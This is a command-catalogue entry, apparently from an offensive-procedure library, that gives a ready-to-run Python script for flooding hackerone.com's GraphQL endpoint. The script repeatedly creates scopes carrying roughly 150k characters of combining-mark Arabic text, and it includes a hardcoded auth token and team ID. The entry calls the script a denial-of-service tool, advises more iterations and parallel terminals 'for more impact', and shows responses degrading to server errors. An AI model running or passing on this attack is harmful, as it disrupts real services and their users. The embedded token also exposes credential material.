---
id: cmd-send-oversized-payloads
data: >-
  import requests

  g = input('Enter : ')

  burp0_url = 'https://hackerone.com:443/graphql'

  burp0_cookies = {}  # User sets cookies

  burp0_headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64;
  rv:77.0) Gecko/20100101 Firefox/77.0', 'Accept': '*/*', 'Accept-Language':
  'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Referer':
  'https://hackerone.com/testingfordos/scopes/new', 'content-type':
  'application/json', 'X-Auth-Token':
  'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1OTI1MzI0MzV9.qyfpwC--aQXOLd9TQ7l-016rI0wXZ33ocCvL10DU6dc----5047344',
  'Origin': 'https://hackerone.com', 'Connection': 'close'}

  a = ''

  for i in range(15000):
      a += 'بٍٍٍٍََُُُِّّّْرٍٍٍٍََُُِِّّّْآٍٍٍَُّ '
  instruction = a + a + a + a + a + a + a + a + a + a

  for i in range(50):
      burp0_json={'operationName': 'CreateStructuredScope', 'query': 'mutation CreateStructuredScope($team_id: ID!, $asset_type: StructuredScopeAssetTypeEnum, $asset_identifier: String!, $eligible_for_bounty: Boolean, $eligible_for_submission: Boolean, $instruction: String, $availability_requirement: String, $confidentiality_requirement: String, $integrity_requirement: String, $reference: String, $notify_subscribers_of_changes: Boolean, $custom_message: String, $label_ids: [ID!]) {\n  createStructuredScope(input: {team_id: $team_id, asset_type: $asset_type, asset_identifier: $asset_identifier, eligible_for_bounty: $eligible_for_bounty, eligible_for_submission: $eligible_for_submission, instruction: $instruction, availability_requirement: $availability_requirement, confidentiality_requirement: $confidentiality_requirement, integrity_requirement: $integrity_requirement, reference: $reference, notify_subscribers_of_changes: $notify_subscribers_of_changes, custom_message: $custom_message, label_ids: $label_ids}) {\n    was_successful\n    team {\n      id\n      structured_scopes(first: 500) {\n        edges {\n          node {\n            id\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    errors(first: 100) {\n      edges {\n        node {\n          id\n          type\n          field\n          message\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n', 'variables': {'asset_identifier': str(i) + str(g) + '.com', 'asset_type': 'URL', 'availability_requirement': 'high', 'confidentiality_requirement': 'high', 'eligible_for_bounty': True, 'eligible_for_submission': True, 'instruction': instruction, 'integrity_requirement': 'high', 'label_ids': [], 'notify_subscribers_of_changes': True, 'reference': 'sadasdasdas', 'team_id': 'Z2lkOi8vaGFja2Vyb25lL1RlYW0vNDkwNzg='}}
      x = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
      print(str(x.status_code) + ' Status - Delay : ' + str(x.elapsed.total_seconds()) + ' seconds')
      print(x._content)
tags:
  - dos
  - graphql
  - python
type: command
output: |-
  201 Status - Delay : 0.5 seconds
  {"data": {"createStructuredScope": {"was_successful": true}}}
  ... (progressing to 500 Status - Delay : 15.2 seconds
  Internal Server Error)
executor: python
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:56.712Z'
verified: false
validated: true
submitted: true
---
# send-oversized-graphql-payloads

## Command

```python
import requests
g = input('Enter : ')
burp0_url = 'https://hackerone.com:443/graphql'
burp0_cookies = {}  # User sets cookies
burp0_headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0', 'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Referer': 'https://hackerone.com/testingfordos/scopes/new', 'content-type': 'application/json', 'X-Auth-Token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1OTI1MzI0MzV9.qyfpwC--aQXOLd9TQ7l-016rI0wXZ33ocCvL10DU6dc----5047344', 'Origin': 'https://hackerone.com', 'Connection': 'close'}
a = ''
for i in range(15000):
    a += 'بٍٍٍٍََُُُِّّّْرٍٍٍٍََُُِِّّّْآٍٍٍَُّ '
instruction = a + a + a + a + a + a + a + a + a + a
for i in range(50):
    burp0_json={'operationName': 'CreateStructuredScope', 'query': 'mutation CreateStructuredScope($team_id: ID!, $asset_type: StructuredScopeAssetTypeEnum, $asset_identifier: String!, $eligible_for_bounty: Boolean, $eligible_for_submission: Boolean, $instruction: String, $availability_requirement: String, $confidentiality_requirement: String, $integrity_requirement: String, $reference: String, $notify_subscribers_of_changes: Boolean, $custom_message: String, $label_ids: [ID!]) {\n  createStructuredScope(input: {team_id: $team_id, asset_type: $asset_type, asset_identifier: $asset_identifier, eligible_for_bounty: $eligible_for_bounty, eligible_for_submission: $eligible_for_submission, instruction: $instruction, availability_requirement: $availability_requirement, confidentiality_requirement: $confidentiality_requirement, integrity_requirement: $integrity_requirement, reference: $reference, notify_subscribers_of_changes: $notify_subscribers_of_changes, custom_message: $custom_message, label_ids: $label_ids}) {\n    was_successful\n    team {\n      id\n      structured_scopes(first: 500) {\n        edges {\n          node {\n            id\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    errors(first: 100) {\n      edges {\n        node {\n          id\n          type\n          field\n          message\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n', 'variables': {'asset_identifier': str(i) + str(g) + '.com', 'asset_type': 'URL', 'availability_requirement': 'high', 'confidentiality_requirement': 'high', 'eligible_for_bounty': True, 'eligible_for_submission': True, 'instruction': instruction, 'integrity_requirement': 'high', 'label_ids': [], 'notify_subscribers_of_changes': True, 'reference': 'sadasdasdas', 'team_id': 'Z2lkOi8vaGFja2Vyb25lL1RlYW0vNDkwNzg='}}
    x = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
    print(str(x.status_code) + ' Status - Delay : ' + str(x.elapsed.total_seconds()) + ' seconds')
    print(x._content)
```

## Description

This Python script automates DoS by sending 50 looped POST requests to a GraphQL endpoint with an oversized instruction payload (~150k characters of Arabic text), exploiting validation gaps to cause server exhaustion.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| g | User input for domain prefix in asset_identifier (e.g., 'test') | Yes |
| burp0_cookies | Dictionary of session cookies for authentication | Yes |
| X-Auth-Token | JWT token in headers for API access | Yes |
| team_id | Base64-encoded team ID in variables | Yes |
| instruction | Concatenated large string (a * 10) | Auto-generated |
| loop range(50) | Number of iterations; increase for more impact | Configurable |

## Examples

### Basic Usage

```python
# Run as-is after setting cookies/token; enter 'test' when prompted
python flood_script.py
```

### Advanced Usage

```python
# Modify loop to 100 iterations and run in multiple terminals
for i in range(100):  # Edit script
    # ...
```

## Expected Output

Description of what output to expect when the command runs successfully.

201 Status - Delay : 0.123 seconds
{"data":{"createStructuredScope":{"was_successful":true}}}
500 Status - Delay : 12.456 seconds
{"errors":[{"message":"Internal Server Error"}]}

## Related

- [[procedures/Flood-Server-with-Oversized-Payloads]]
